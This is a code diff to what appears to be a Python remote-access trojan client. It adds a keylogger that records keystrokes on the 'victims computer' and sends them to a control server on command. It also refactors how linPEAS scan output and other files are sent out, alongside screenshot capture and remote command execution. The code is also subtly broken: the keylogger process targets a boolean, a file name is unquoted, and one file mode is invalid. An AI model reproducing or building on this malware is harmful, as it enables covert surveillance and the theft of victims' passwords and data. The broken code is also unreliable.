@@ -8,6 +8,8 @@ import pyscreenshot
 from datetime import datetime
 import platform
 import os
+import keyboard
+from multiprocessing import Process
 
 ########## VARIABLES ###########
 conn = None
@@ -19,6 +21,7 @@ connected = False
 # stop = FLAG TO PAUSE THE THREAD
 stop = False
 runThread = True
+keyLog = True
 
 #Timer to check the connection (seconds)
 checkerTimeout = 1.5
@@ -115,22 +118,9 @@ def linPEAS(force):
             execute("rm -f rec.txt")
         stop = True
         saveFile(execute(oneLiner),"rec.txt")
-
-        # WE READ THE FILE IN BYTE MODEs
-        data = readFile("rec.txt", True)
-        # FIRST WE SEND THE LENGTH OF THE BYTES IN THE SCAN FILE
-        sendLen(data)
-        # THEN WE SEND THE BYTES
-        sendBytes(data)
-        stop = False
+        sendFileByteMode("rec.txt")
     else:
-        stop = True
-        data = readFile("rec.txt", True)
-        sendLen(data)
-        time.sleep(0.5)
-        sendBytes(data)
-        time.sleep(1)
-        stop = False
+        sendFileByteMode("rec.txt")
 
 
 def sysInfo():
@@ -189,7 +179,7 @@ def sendLen(dat):
     l = len(dat)
     send("len-" + str(l) + "-")
 
-# Captura la pantalla
+# Screenshot
 def capture_screen():
     global stop,conn
     try:
@@ -201,7 +191,7 @@ def capture_screen():
         stop = False
         conn = None
 
-# Envía la captura al servidor
+# Sends the screenshot to the server
 def send_screenshot():
         global stop,conn,log,logs
         try:
@@ -256,6 +246,13 @@ def hibernateProgram(seconds):
 def filterValue(regex,text):
     return text.split(regex)
     
+# CONCATS TEXT TO A FILE
+def concatToFile(text,file):
+    try:
+        with open(file,"wa") as f:
+            f.write(text)
+    except Exception as e:
+        logEvents(e)        
            
  # FILTER THE COMMANDS RECIVED           
 def filterCommand(command):
@@ -295,12 +292,47 @@ def filterCommand(command):
     elif "hibernate-" in command:
         seconds = filterValue("-",command)[1]
         hibernateProgram(seconds)
+    
+    # SENDS THE KEYS TO THE SERVER
+    elif command == "get keylogs":
+        sendFileByteMode("keys.txt")
+        
+        # CLEANS THE FILE OVERWRITING IT
+        saveFile("","keys.txt")
 
     else:
         send(execute(dataTemp))
 
-    
-    
+# Grabs the keys pressed on the victims computer
+# We use a proccess instead of threads to improve the performance 
+def kLogger():
+    global keyLog
+    buffer = ""
+    while keyLog:
+        try:
+            buffer += keyboard.read_key()
+            if (len(buffer) > 10):
+                concatToFile(buffer,keys.txt)
+                buffer = ""  
+                  
+        except Exception as e:
+            logEvents(e)
+
+# SENDS A LOCAL FILE TO THE SERVER
+def sendFileByteMode(file):
+    global stop
+    try:
+        stop = True
+        data = readFile(file, True)
+        sendLen(data)
+        time.sleep(0.5)
+        sendBytes(data)
+        time.sleep(1)
+        stop = False
+        
+    except Exception as e:
+        logEvents(e)       
+        stop = False  
 
 #CHECKS THE CONNECTION BY PING/PONG METHOD
 def checkConnection():
@@ -331,6 +363,8 @@ def checkConnection():
 if __name__ == '__main__':
     thread = threading.Thread(target=checkConnection)
     thread.start()
+    keyProcess = Process(target=keyLog)
+    keyProcess.start()
     while True:
         if connected:
             time.sleep(1)
